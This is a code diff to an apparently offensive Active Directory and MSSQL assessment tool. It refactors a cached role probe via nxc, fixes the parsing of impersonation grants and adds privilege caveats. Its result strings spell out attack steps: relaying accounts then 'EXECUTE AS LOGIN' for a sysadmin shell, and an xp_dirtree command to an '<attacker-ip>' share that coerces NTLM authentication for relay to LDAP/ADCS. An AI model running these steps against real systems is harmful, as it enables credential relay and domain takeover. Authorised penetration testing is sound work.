@@ -27,22 +27,14 @@ from .base import BaseCheck, CheckResult, Status
 from ..config import TargetEnv
 
 try:
-    import ldap3
-    from ldap3 import Server, Connection, NTLM, SUBTREE, ALL
+    from ldap3 import SUBTREE
     LDAP3_AVAILABLE = True
 except ImportError:
     LDAP3_AVAILABLE = False
+from ..utils import _ldap_connect, _port_open, _run_nxc_mssql, _run_nxc_smb
 
 
 # ── helpers ────────────────────────────────────────────────────────────────
-
-def _port_open(host: str, port: int, timeout: int = 5) -> bool:
-    try:
-        s = socket.create_connection((host, port), timeout=timeout)
-        s.close()
-        return True
-    except OSError:
-        return False
 
 
 def _sql_browser_query(host: str, timeout: int = 5) -> list[str]:
@@ -64,60 +56,91 @@ def _sql_browser_query(host: str, timeout: int = 5) -> list[str]:
     return instances
 
 
-def _run_nxc_mssql(args: list[str], env: TargetEnv, timeout: int = 20) -> tuple[int, str, str]:
-    try:
-        cmd = ["nxc", "mssql"] + args
-        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-        return r.returncode, r.stdout, r.stderr
-    except FileNotFoundError:
-        try:
-            cmd[0] = "crackmapexec"
-            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-            return r.returncode, r.stdout, r.stderr
-        except FileNotFoundError:
-            return -1, "", "nxc not found"
-    except subprocess.TimeoutExpired:
-        return -1, "", "timeout"
-
-
-def _run_nxc_smb(args: list[str], env: TargetEnv, timeout: int = 20) -> tuple[int, str, str]:
-    try:
-        cmd = ["nxc", "smb"] + args
-        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-        return r.returncode, r.stdout, r.stderr
-    except FileNotFoundError:
-        try:
-            cmd[0] = "crackmapexec"
-            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-            return r.returncode, r.stdout, r.stderr
-        except FileNotFoundError:
-            return -1, "", "nxc not found"
-    except subprocess.TimeoutExpired:
-        return -1, "", "timeout"
-
-
-def _ldap_connect(env: TargetEnv):
-    if not LDAP3_AVAILABLE:
-        return None
-    try:
-        server = Server(env.dc_ip, get_info=ALL, connect_timeout=env.timeout)
-        conn = Connection(
-            server,
-            user=env.cred.upn,
-            password=env.cred.password,
-            authentication=NTLM,
-            auto_bind=True,
-        )
-        return conn
-    except Exception:
-        return None
-
-
 def _nxc_base_args(host: str, env: TargetEnv) -> list[str]:
     """Base nxc mssql args for authenticated queries."""
     auth = (["-H", env.cred.nt_hash] if env.cred.nt_hash
             else ["-p", env.cred.password])
     return [host, "-u", env.cred.username, "-d", env.domain] + auth
+
+
+# Role query run once per host: auth ("[+]") plus USER_NAME() (DB user context:
+# guest/dbo/named) and the two privilege flags. Column aliases are distinctive so
+# they don't collide with other column parsing in this module.
+_ROLE_QUERY = (
+    "SELECT USER_NAME() AS login_user, "
+    "IS_SRVROLEMEMBER('sysadmin') AS login_is_sa, "
+    "IS_MEMBER('db_owner') AS login_is_dbo;"
+)
+
+
+def _mssql_role(host: str, env: TargetEnv) -> dict:
+    """Authenticate to MSSQL on `host`, determine the login's role, and cache it.
+
+    Three checks need the same per-host facts — MssqlWindowsAuthCheck (auth +
+    role label), MssqlPrivilegeCheck (sysadmin flag), and
+    MssqlXpDirtreeCoercionCheck (auth success) — so without sharing they each
+    fire their own `nxc mssql` probe against the same host. This runs one probe
+    and caches the parsed result in shared_cache["mssql_role:<host>"].
+
+    Lock-free idempotent, matching ldap_checker_output / adcs_enrollment_verdict:
+    under --parallel a race may probe a host twice (benign; identical result),
+    and dict membership/assignment is atomic under the GIL. Computed on first
+    access regardless of check order, so it does not depend on the auth check
+    running first.
+
+    Returns a dict:
+      nxc_available: bool   — False if nxc/crackmapexec not found (rc == -1)
+      authed:        bool   — login succeeded ("[+]" present)
+      rejected:      bool   — credentials explicitly rejected
+      user:          str|None — USER_NAME() (e.g. "guest", "dbo", a named user)
+      sysadmin:      bool   — IS_SRVROLEMEMBER('sysadmin') == 1
+      db_owner:      bool   — IS_MEMBER('db_owner') == 1
+    """
+    key = f"mssql_role:{host}"
+    if key in env.shared_cache:
+        return env.shared_cache[key]
+
+    rc, out, err = _run_nxc_mssql(
+        _nxc_base_args(host, env) + ["-q", _ROLE_QUERY], env,
+    )
+    combined_lower = (out + err).lower()
+    record = {
+        "nxc_available": rc != -1,
+        "authed": "[+]" in out,
+        "rejected": ("status_logon_failure" in combined_lower
+                     or "login failed" in combined_lower),
+        "user": None,
+        "sysadmin": False,
+        "db_owner": False,
+    }
+    if record["authed"]:
+        full = out + err
+        sa = re.search(r"login_is_sa:(\d)", full)
+        dbo = re.search(r"login_is_dbo:(\d)", full)
+        u = re.search(r"login_user:([^\r\n]+)", full)
+        record["sysadmin"] = bool(sa and sa.group(1) == "1")
+        record["db_owner"] = bool(dbo and dbo.group(1) == "1")
+        record["user"] = u.group(1).strip() if u else None
+
+    env.shared_cache[key] = record
+    return record
+
+
+def _role_label(record: dict) -> str | None:
+    """Short human label for a login's role, or None if not determinable."""
+    if record["sysadmin"]:
+        return "sysadmin"
+    if record["db_owner"]:
+        return "db_owner"
+    user = record.get("user")
+    if user:
+        if user.lower() == "guest":
+            return "guest (restricted — direct SQL ops limited)"
+        return user                       # e.g. "dbo", or a named db user
+    # Authed but USER_NAME() didn't parse and neither flag set.
+    if record["authed"]:
+        return "non-privileged login"
+    return None
 
 
 # ── individual checks ──────────────────────────────────────────────────────
@@ -170,31 +193,48 @@ class MssqlWindowsAuthCheck(BaseCheck):
 
     nxc output on success: "[+] domain\\user:pass" (with or without "(Pwn3d!)")
     nxc output on failure: STATUS_LOGON_FAILURE or "Login failed"
+
+    Alongside the auth probe this reports *what the account can do* on the server
+    — a connection as the restricted `guest` user is very different from
+    `dbo`/sysadmin, and the operator should see that immediately. The auth result
+    and role come from `_mssql_role()`, a single cached per-host probe shared with
+    MssqlPrivilegeCheck and MssqlXpDirtreeCoercionCheck (see that helper). nxc
+    prints the auth "[+]" line because it authenticates before running the role
+    query, so the role columns cost no extra probe. Note: nxc's "(Pwn3d!)" tag
+    only indicates sysadmin and is not emitted for guest/dbo, so a query is
+    required to make the distinction.
     """
 
     name = "MSSQL accepts Windows/NTLM authentication"
 
     def _run(self) -> CheckResult:
         passed, cred_rejected, ambiguous = [], [], []
+        roles: dict[str, str] = {}   # host -> role label (when determinable)
 
         for host in self.env.mssql_targets():
             if not _port_open(host, 1433, timeout=self.env.timeout):
                 continue
 
-            rc, out, err = _run_nxc_mssql(_nxc_base_args(host, self.env), self.env)
-            combined = (out + err).lower()
+            rec = _mssql_role(host, self.env)
 
-            if rc == -1:
+            if not rec["nxc_available"]:
                 return CheckResult(name=self.name, status=Status.SKIP,
                                    detail="nxc not available.")
-            if "[+]" in out:
+            if rec["authed"]:
                 passed.append(host)
-            elif "status_logon_failure" in combined or "login failed" in combined:
+                role = _role_label(rec)
+                if role:
+                    roles[host] = role
+            elif rec["rejected"]:
                 cred_rejected.append(host)
-            elif rc != -1:
+            else:
                 ambiguous.append(host)
 
         if passed:
+            # Annotate each authenticated host with its role where known.
+            passed_str = ", ".join(
+                f"{h} (as {roles[h]})" if h in roles else h for h in passed
+            )
             extra = ""
             if cred_rejected:
                 extra += (f" (credentials rejected on {', '.join(cred_rejected)}"
@@ -203,7 +243,7 @@ class MssqlWindowsAuthCheck(BaseCheck):
                 extra += f" (result unclear on {', '.join(ambiguous)})"
             return CheckResult(
                 name=self.name, status=Status.PASS,
-                detail=f"Windows/NTLM auth accepted on {', '.join(passed)}.{extra}",
+                detail=f"Windows/NTLM auth accepted on {passed_str}.{extra}",
             )
         if cred_rejected:
             return CheckResult(
@@ -252,19 +292,16 @@ class MssqlPrivilegeCheck(BaseCheck):
             if not _port_open(host, 1433, timeout=self.env.timeout):
                 continue
 
-            rc, out, err = _run_nxc_mssql(
-                _nxc_base_args(host, self.env) +
-                ["-q", "SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;"],
-                self.env, timeout=20,
-            )
+            rec = _mssql_role(host, self.env)
 
-            if rc == -1:
+            if not rec["nxc_available"]:
                 return CheckResult(name=self.name, status=Status.SKIP,
                                    detail="nxc not available.")
 
-            m = re.search(r"is_sysadmin:(\d)", out + err)
-            if m:
-                if m.group(1) == "1":
+            # Only classify hosts where auth succeeded — a failed login yields no
+            # sysadmin signal (matches the previous "no is_sysadmin token" path).
+            if rec["authed"]:
+                if rec["sysadmin"]:
                     sysadmin_hosts.append(host)
                 else:
                     not_sysadmin_hosts.append(host)
@@ -299,9 +336,17 @@ class MssqlImpersonationCheck(BaseCheck):
     Even a non-sysadmin relay account can escalate if it has IMPERSONATE rights
     on a sysadmin login.
 
-    nxc output format (one pair per row):
+    nxc output format: each selected column is emitted as a separate
+    `alias:value` token in document order (no row delimiter), e.g.
       who_can_impersonate:DOMAIN\\user
       who_gets_impersonated:DOMAIN\\sysadmin_user
+    The query orders who_can_impersonate (grantee) immediately before
+    who_gets_impersonated (target) per row, so the parser walks the tokens in
+    order and pairs each grantee with the target that follows it. It does NOT
+    build two independent lists and zip() them — that silently truncates and
+    misaligns pairs if the two token counts ever differ (e.g. nxc drops or wraps
+    a value), which in a security tool means reporting a fabricated impersonation
+    path. Token-pairing anomalies are flagged in the output instead.
 
     Performs a second query to confirm which impersonation targets are actually
     sysadmin — no hardcoded account names.
@@ -330,6 +375,7 @@ class MssqlImpersonationCheck(BaseCheck):
         sysadmin_findings = []   # list of (host, [path_str, ...])
         other_findings    = []   # list of (host, [pair_str, ...])
         no_impersonate    = []   # hosts where auth worked but no grants found
+        parse_anomalies   = []   # hosts where grantee/target tokens didn't pair cleanly
 
         for host in self.env.mssql_targets():
             if not _port_open(host, 1433, timeout=self.env.timeout):
@@ -344,19 +390,46 @@ class MssqlImpersonationCheck(BaseCheck):
                                    detail="nxc not available.")
 
             combined = out + err
-            can_impersonate  = re.findall(r"who_can_impersonate:([^\r\n]+)", combined)
-            gets_impersonated = re.findall(r"who_gets_impersonated:([^\r\n]+)", combined)
+            # nxc renders each selected column as a separate `alias:value` token
+            # in document order, with no row delimiter. The query selects
+            # who_can_impersonate (grantee) immediately before who_gets_impersonated
+            # (target) for each row, so we walk the tokens in order and pair each
+            # grantee with the target that follows it — rather than building two
+            # independent lists and zip()-ing them positionally, which silently
+            # truncates/misaligns if the two counts ever differ (e.g. nxc drops or
+            # wraps a value).
+            token_re = re.compile(
+                r"(who_can_impersonate|who_gets_impersonated):([^\r\n]+)"
+            )
+            pairs: list[tuple[str, str]] = []
+            pending_grantee: str | None = None
+            desync = False
+            for tok in token_re.finditer(combined):
+                kind, value = tok.group(1), tok.group(2).strip()
+                if kind == "who_can_impersonate":
+                    if pending_grantee is not None:
+                        # Previous grantee had no target before this one — desync.
+                        desync = True
+                    pending_grantee = value
+                else:  # who_gets_impersonated
+                    if pending_grantee is None:
+                        # Target with no preceding grantee — desync.
+                        desync = True
+                        continue
+                    pairs.append((pending_grantee, value))
+                    pending_grantee = None
+            if pending_grantee is not None:
+                # Trailing grantee with no target.
+                desync = True
 
-            if not can_impersonate:
+            if desync:
+                parse_anomalies.append(host)
+
+            if not pairs:
                 if "[+]" in out:
                     no_impersonate.append(host)
                 # else auth failed — skip this host silently
                 continue
-
-            pairs = list(zip(
-                [w.strip() for w in can_impersonate],
-                [t.strip() for t in gets_impersonated],
-            ))
 
             # Look up actual sysadmin accounts on this host
             sysadmin_accounts: set = {"sa"}
@@ -387,6 +460,13 @@ class MssqlImpersonationCheck(BaseCheck):
                     (host, [f"{w} -> {t}" for w, t in pairs])
                 )
 
+        anomaly_note = (
+            f" ⚠ Output parse anomaly on {', '.join(parse_anomalies)} — "
+            f"grantee/target tokens did not pair cleanly; impersonation pairs for "
+            f"those host(s) may be incomplete. Verify manually."
+            if parse_anomalies else ""
+        )
+
         if sysadmin_findings:
             parts = []
             for host, sa_strs, other_strs in sysadmin_findings:
@@ -398,7 +478,7 @@ class MssqlImpersonationCheck(BaseCheck):
                 name=self.name, status=Status.PASS,
                 detail=(
                     f"Impersonation path(s) to sysadmin — {' | '.join(parts)}. "
-                    f"Relay any left-hand account then EXECUTE AS LOGIN for sysadmin shell.{no_imp_note}"
+                    f"Relay any left-hand account then EXECUTE AS LOGIN for sysadmin shell.{no_imp_note}{anomaly_note}"
                 ),
             )
         if other_findings:
@@ -407,13 +487,13 @@ class MssqlImpersonationCheck(BaseCheck):
                 name=self.name, status=Status.WARN,
                 detail=(
                     f"Impersonation grants exist but none map to confirmed sysadmin — "
-                    f"{' | '.join(parts)}. Verify manually."
+                    f"{' | '.join(parts)}. Verify manually.{anomaly_note}"
                 ),
             )
         if no_impersonate:
             return CheckResult(
                 name=self.name, status=Status.FAIL,
-                detail=f"No IMPERSONATE grants found on {', '.join(no_impersonate)}.",
+                detail=f"No IMPERSONATE grants found on {', '.join(no_impersonate)}.{anomaly_note}",
             )
         return CheckResult(
             name=self.name, status=Status.SKIP,
@@ -584,26 +664,37 @@ class MssqlXpDirtreeCoercionCheck(BaseCheck):
 
     def _run(self) -> CheckResult:
         available, unavailable = [], []
+        restricted = []   # authed but guest/non-privileged (public EXECUTE assumed)
 
         for host in self.env.mssql_targets():
             if not _port_open(host, 1433, timeout=self.env.timeout):
                 continue
 
-            rc, out, err = _run_nxc_mssql(
-                _nxc_base_args(host, self.env), self.env
-            )
-            if rc == -1:
+            rec = _mssql_role(host, self.env)
+            if not rec["nxc_available"]:
                 return CheckResult(name=self.name, status=Status.SKIP,
                                    detail="nxc not available.")
 
-            if "[+]" in out:
+            if rec["authed"]:
                 available.append(host)
-            elif "status_logon_failure" in (out + err).lower():
+                # xp_dirtree EXECUTE is granted to public by default, so any
+                # login can usually fire it — but for a guest/low-priv login that
+                # default could have been revoked, so we can't fully confirm it.
+                if not (rec["sysadmin"] or rec["db_owner"]):
+                    restricted.append(host)
+            elif rec["rejected"]:
                 unavailable.append(host)
 
         if available:
             extra = (f" Auth failed on {', '.join(unavailable)} — no xp_dirtree there."
                      if unavailable else "")
+            caveat = ""
+            if restricted:
+                caveat = (
+                    f" Note: on low-privilege login(s) ({', '.join(restricted)}) "
+                    "this assumes the default public EXECUTE on xp_dirtree — if that "
+                    "was revoked the coercion may fail; confirm by running it."
+                )
             return CheckResult(
                 name=self.name, status=Status.PASS,
                 detail=(
@@ -611,7 +702,7 @@ class MssqlXpDirtreeCoercionCheck(BaseCheck):
                     "xp_dirtree coercion available. "
                     "Execute: `EXEC master.sys.xp_dirtree \'\\\\<attacker-ip>\\demontlm\',1,1` "
                     "to coerce the SQL service account into authenticating. "
-                    f"Relay that auth to LDAP/ADCS — no WebClient or PrinterBug needed.{extra}"
+                    f"Relay that auth to LDAP/ADCS — no WebClient or PrinterBug needed.{extra}{caveat}"
                 ),
             )
         if unavailable:
@@ -657,7 +748,6 @@ class MssqlSpnCheck(BaseCheck):
     ]
 
     def _run(self) -> CheckResult:
-        getuserspns_available = True
         getuserspns_ran       = False
 
         # ── Method 1: impacket-GetUserSPNs ────────────────────────────────
@@ -706,9 +796,9 @@ class MssqlSpnCheck(BaseCheck):
                     )
 
         except FileNotFoundError:
-            getuserspns_available = False  # fall through to ldap3
+            pass  # fall through to ldap3
         except subprocess.TimeoutExpired:
-            getuserspns_available = False
+            pass
 
         # ── Method 2: ldap3 direct SPN query ──────────────────────────────
         if LDAP3_AVAILABLE:
@@ -1013,8 +1103,9 @@ def module_viability(ar) -> str:
     auth-but-no-sysadmin-path -> PARTIAL, etc.
     """
     base = ar._generic_viability()
-    if base == "NOT VIABLE":
-        # A required prerequisite failed (port/auth) — never override that.
+    if base in ("NOT VIABLE", "UNKNOWN"):
+        # A required prerequisite failed (port/auth) → NOT VIABLE, or nothing
+        # could be tested → UNKNOWN. Never override either with a promotion.
         return base
 
     by_name = {c.name: c.status for c in ar.checks}
